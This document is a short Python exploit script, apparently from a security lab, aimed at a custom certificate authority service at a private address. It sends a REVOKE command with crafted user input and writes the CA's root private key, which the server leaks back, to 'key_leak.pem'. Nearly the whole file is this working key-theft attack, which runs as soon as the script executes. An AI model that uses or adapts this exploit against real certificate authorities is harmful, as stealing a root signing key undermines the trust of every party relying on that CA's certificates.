#functions to communicate with the CA and trigger CA-related actions


import socket
import ssl


#operations supported by the CA

#operations supported by the server
REVOKE_CERT = 'REVOKE'
CONTINUE= 'CONT'

#messages sent by server
REVOKE_OK = 'revocationOK'
REVOKE_FAIL = 'revocationFAIL'
ALREADY_ISSUED_ERROR = 'ALREADY_ISSUED'

    
CA_IP = '10.10.10.3'
CA_PORT = 6001

BUFFER_SIZE = 1024

#PATHS

PATH = "key_leak.pem"


#do as in revoke but will retrieve root key
def exploit(userInfo):

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
       
        sock.settimeout(0.3)

        try:
            sock.connect((CA_IP, CA_PORT))

            #send instruction
            sock.send(REVOKE_CERT.encode())

            status = sock.recv(BUFFER_SIZE)

            if(status.decode() != CONTINUE):
                sock.shutdown(socket.SHUT_RDWR)   
                sock.close()
                return -1

            sock.send(userInfo.encode())                     

            # retrieve root key 

            f = open(PATH, 'wb')
            data = sock.recv(BUFFER_SIZE)

            while(data):
                f.write(data)
                data = sock.recv(BUFFER_SIZE)

            f.close()

             #retrieve error message if any

            status = sock.recv(BUFFER_SIZE)

            if status.decode() != REVOKE_OK:      
                sock.shutdown(socket.SHUT_RDWR)   
                sock.close()
                return -1

            sock.shutdown(socket.SHUT_RDWR)
            sock.close()

        except Exception as e:
            print(e)
            print('error occured while performing exploit')
                
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            return -1

    return 0


exploit("ms")